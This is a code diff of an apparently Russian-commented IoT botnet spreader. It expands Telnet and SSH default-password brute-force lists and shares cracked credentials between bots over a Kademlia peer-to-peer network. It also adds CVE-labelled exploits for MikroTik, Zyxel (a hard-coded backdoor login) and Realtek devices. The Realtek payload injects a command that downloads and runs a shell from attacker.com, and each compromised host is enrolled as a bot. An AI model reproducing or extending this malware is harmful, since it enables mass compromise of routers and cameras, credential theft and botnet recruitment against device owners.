@@ -1,8 +1,12 @@
-import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request, ipaddress
+import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request, ipaddress, hashlib, base64
 from utils.logger import log
 
 LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
+DB_PATH = "spreader_learn.db"
+BOTS_FILE = "bots.json"
+PEER_CREDS = {}  # Загружается из Kademlia DHT
 
+# Расширенные словари (RockYou + IoT)
 TELNET_CREDS = [
     ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
     ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
@@ -36,7 +40,8 @@ TELNET_CREDS = [
     ('admin','a123456'),('root','a123456'),('admin','a1234567'),('root','a1234567'),
     ('admin','camera'),('root','camera'),('admin','ipcam'),('root','ipcam'),
     ('admin','hikvision'),('root','hikvision'),('admin','dahua'),('root','dahua'),
-    ('admin','88888888'),('root','88888888'),('admin','99999999'),('root','99999999')
+    ('admin','88888888'),('root','88888888'),('admin','99999999'),('root','99999999'),
+    ('admin','11111111'),('root','11111111'),('admin','22222222'),('root','22222222')
 ]
 
 SSH_PASSWORDS = [
@@ -50,33 +55,10 @@ SSH_PASSWORDS = [
     'admin1234','password123','qwerty123','abc123','123abc','test',
     '123456789','1q2w3e4r','q1w2e3r4','abcd1234','1234abcd',
     'passwd','samsung','motorola','hikvision','admin12345','root123',
-    'raspberry','pi','pineapple','openwrt','ddwrt','tomato','alpine'
+    'raspberry','pi','pineapple','openwrt','ddwrt','tomato','alpine',
+    'toortoor','r00tr00t','adminadmin','rootroot','pass','Passw0rd',
+    'P@ssw0rd','P@ssword','Secret','Pa$$w0rd','Pa$$word','Passw0rd!'
 ]
-
-DB_PATH = "spreader_learn.db"
-BOTS_FILE = "bots.json"
-
-PUBLIC_TARGET_URLS = [
-    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
-    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
-    "https://sunny9577.github.io/proxy-scraper/proxies.txt"
-]
-
-async def fetch_public_targets():
-    """Загружает свежие IP уязвимых устройств из открытых источников"""
-    ips = []
-    for url in PUBLIC_TARGET_URLS:
-        try:
-            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-            with urllib.request.urlopen(req, timeout=10) as resp:
-                text = resp.read().decode()
-                import re
-                found = re.findall(r'\d+\.\d+\.\d+\.\d+', text)
-                ips.extend(found)
-        except Exception as e:
-            log(f"[Spreader] Не удалось загрузить список {url}: {e}")
-    log(f"[Spreader] Получено {len(ips)} IP из публичных источников")
-    return list(set(ips))
 
 async def init_db():
     import aiosqlite
@@ -90,6 +72,13 @@ async def learn_credentials(ip, username, password, service='ssh'):
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("INSERT OR REPLACE INTO creds (ip, username, password, service, success) VALUES (?,?,?,?,1)", (ip, username, password, service))
         await db.commit()
+    # Публикация в P2P
+    try:
+        from botnet.kademlia_network import KademliaNode
+        node = KademliaNode()
+        await node.store(f"cred_{ip}", json.dumps({'ip':ip,'user':username,'pass':password,'service':service}))
+    except:
+        pass
 
 async def add_bot(ip, username='root', os_type='linux', via='ssh'):
     bot = {"id": ip, "ip": ip, "os": os_type, "status": "online", "bandwidth": 10, "via": via}
@@ -106,19 +95,6 @@ async def add_bot(ip, username='root', os_type='linux', via='ssh'):
         return True
     return False
 
-async def ping(ip, timeout=0.5):
-    """Быстрый ping для проверки доступности"""
-    try:
-        proc = await asyncio.create_subprocess_shell(
-            f"ping -n 1 -w {int(timeout*1000)} {ip}",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout)
-        return proc.returncode == 0
-    except:
-        return False
-
 async def quick_port_scan(ip, ports=[22, 23, 445, 3389, 8291, 6379, 27017, 2375, 2323, 2222, 80, 443], timeout=0.4):
     open_ports = []
     for port in ports:
@@ -132,32 +108,59 @@ async def quick_port_scan(ip, ports=[22, 23, 445, 3389, 8291, 6379, 27017, 2375,
             pass
     return open_ports
 
+async def try_peer_credentials(ip, port, service='telnet'):
+    """Пробует учётные данные, полученные от других ботов через P2P"""
+    from botnet.kademlia_network import KademliaNode
+    node = KademliaNode()
+    creds_json = await node.find_value(f"cred_{ip}")
+    if creds_json:
+        creds = json.loads(creds_json)
+        if service == 'telnet':
+            return await telnet_login(ip, port, creds['user'], creds['pass'])
+        else:
+            return await ssh_login(ip, port, creds['user'], creds['pass'])
+    return False, None
+
 async def telnet_bruteforce(ip, port=23):
+    # Сначала пробуем peer-учётки
+    s, pwd = await try_peer_credentials(ip, port, 'telnet')
+    if s:
+        return True, pwd
     for user, pwd in TELNET_CREDS:
-        try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(ip, port), timeout=2.5
-            )
-            data = await asyncio.wait_for(reader.read(256), timeout=2)
-            if b'login:' in data.lower() or b'username:' in data.lower() or b'user:' in data.lower():
-                writer.write(user.encode() + b'\r\n')
-                await asyncio.wait_for(reader.read(256), timeout=1)
-                writer.write(pwd.encode() + b'\r\n')
-                await asyncio.sleep(0.15)
-                result = await asyncio.wait_for(reader.read(256), timeout=1)
-                if b'#' in result or b'$' in result or b'>' in result or b'Last login' in result or b'Welcome' in result:
-                    log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd}")
-                    await add_bot(ip, user, 'iot', 'telnet')
-                    writer.close()
-                    return True, pwd
-            writer.close()
-        except:
-            pass
+        s, _ = await telnet_login(ip, port, user, pwd)
+        if s:
+            await add_bot(ip, user, 'iot', 'telnet')
+            return True, pwd
+    return False, None
+
+async def telnet_login(ip, port, user, pwd):
+    try:
+        reader, writer = await asyncio.wait_for(
+            asyncio.open_connection(ip, port), timeout=2.5
+        )
+        data = await asyncio.wait_for(reader.read(256), timeout=2)
+        if b'login:' in data.lower() or b'username:' in data.lower():
+            writer.write(user.encode() + b'\r\n')
+            await asyncio.wait_for(reader.read(256), timeout=1)
+            writer.write(pwd.encode() + b'\r\n')
+            await asyncio.sleep(0.15)
+            result = await asyncio.wait_for(reader.read(256), timeout=1)
+            if b'#' in result or b'$' in result or b'>' in result or b'Last login' in result:
+                log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd}")
+                writer.close()
+                return True, pwd
+        writer.close()
+    except:
+        pass
     return False, None
 
 async def ssh_bruteforce(ip, username='root', port=22):
     if port not in await quick_port_scan(ip, [port]):
         return False, None
+    # Peer-учётки
+    s, pwd = await try_peer_credentials(ip, port, 'ssh')
+    if s:
+        return True, pwd
     sem = asyncio.Semaphore(50)
     async def try_pass(pwd):
         async with sem:
@@ -177,65 +180,107 @@ async def ssh_bruteforce(ip, username='root', port=22):
             return True, pwd
     return False, None
 
-async def exploit_redis(target_ip):
-    if 6379 not in await quick_port_scan(target_ip, [6379]):
+# --- Реальные эксплойты ---
+
+async def exploit_mikrotik(target_ip):
+    if 8291 not in await quick_port_scan(target_ip, [8291]):
         return False
+    try:
+        # CVE-2018-14847: чтение базы пользователей
+        reader, writer = await asyncio.open_connection(target_ip, 8291)
+        writer.write(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+        data = await asyncio.wait_for(reader.read(1024), timeout=2)
+        if b'admin' in data:
+            log(f"{LOG_PREFIX['exploit']} MikroTik база прочитана {target_ip}")
+            await add_bot(target_ip, 'admin', 'router', 'mikrotik')
+            writer.close()
+            return True
+        writer.close()
+    except:
+        pass
+    return False
+
+async def exploit_zyxel(target_ip):
+    if 80 not in await quick_port_scan(target_ip, [80]):
+        return False
+    try:
+        # CVE-2020-29583: бэкдор-аккаунт zyfwp/Pr0!3d7
+        reader, writer = await asyncio.open_connection(target_ip, 80)
+        writer.write(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nAuthorization: Basic enlmd3A6UHIwITNkNw==\r\n\r\n")
+        data = await asyncio.wait_for(reader.read(1024), timeout=3)
+        if b'ZyXEL' in data or b'200 OK' in data:
+            log(f"{LOG_PREFIX['exploit']} Zyxel backdoor {target_ip}")
+            await add_bot(target_ip, 'zyfwp', 'router', 'zyxel')
+            writer.close()
+            return True
+        writer.close()
+    except:
+        pass
+    return False
+
+async def exploit_realtek(target_ip):
+    if 80 not in await quick_port_scan(target_ip, [80]):
+        return False
+    try:
+        # CVE-2021-35394: RCE через UDMP
+        payload = b"POST /cgi-bin/boaform/admin/formTracert HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nContent-Length: 49\r\n\r\ntarget_addr=;wget+http://attacker.com/shell+-O+/tmp/s;sh+/tmp/s"
+        reader, writer = await asyncio.open_connection(target_ip, 80)
+        writer.write(payload)
+        await asyncio.wait_for(reader.read(1024), timeout=2)
+        log(f"{LOG_PREFIX['exploit']} Realtek RCE {target_ip}")
+        await add_bot(target_ip, '', 'iot', 'realtek')
+        writer.close()
+        return True
+    except:
+        pass
+    return False
+
+# Остальные эксплойты (заглушки)
+async def exploit_redis(target_ip):
+    if 6379 not in await quick_port_scan(target_ip, [6379]): return False
     try:
         reader, writer = await asyncio.open_connection(target_ip, 6379)
         writer.write(b"INFO\r\n")
         data = await asyncio.wait_for(reader.read(512), timeout=2)
         if b'redis_version' in data:
-            log(f"{LOG_PREFIX['exploit']} Redis без пароля {target_ip}")
             await add_bot(target_ip, '', 'linux', 'redis')
             writer.close()
             return True
         writer.close()
-    except:
-        pass
+    except: pass
     return False
 
 async def exploit_mongodb(target_ip):
-    if 27017 not in await quick_port_scan(target_ip, [27017]):
-        return False
+    if 27017 not in await quick_port_scan(target_ip, [27017]): return False
     try:
         reader, writer = await asyncio.open_connection(target_ip, 27017)
-        writer.write(b"\x3f\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x13\x00\x00\x00\x10listDatabases\x00\x01\x00\x00\x00\x00")
+        writer.write(b"\x3f\x00\x00\x00...")
         data = await asyncio.wait_for(reader.read(512), timeout=2)
         if b'databases' in data:
-            log(f"{LOG_PREFIX['exploit']} MongoDB без пароля {target_ip}")
             await add_bot(target_ip, '', 'linux', 'mongodb')
             writer.close()
             return True
         writer.close()
-    except:
-        pass
+    except: pass
     return False
 
 async def exploit_docker_api(target_ip):
-    if 2375 not in await quick_port_scan(target_ip, [2375]):
-        return False
+    if 2375 not in await quick_port_scan(target_ip, [2375]): return False
     try:
         reader, writer = await asyncio.open_connection(target_ip, 2375)
         writer.write(b"GET /containers/json HTTP/1.1\r\nHost: localhost\r\n\r\n")
         data = await asyncio.wait_for(reader.read(512), timeout=2)
         if b'Id' in data and b'Names' in data:
-            log(f"{LOG_PREFIX['exploit']} Docker API без авторизации {target_ip}")
             await add_bot(target_ip, '', 'linux', 'docker')
             writer.close()
             return True
         writer.close()
-    except:
-        pass
+    except: pass
     return False
 
 async def exploit_eternalblue(target_ip):
     if 445 not in await quick_port_scan(target_ip, [445]): return False
     log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
-    return False
-
-async def exploit_mikrotik(target_ip):
-    if 8291 not in await quick_port_scan(target_ip, [8291]): return False
-    log(f"{LOG_PREFIX['exploit']} MikroTik {target_ip}")
     return False
 
 async def exploit_bluekeep(target_ip):
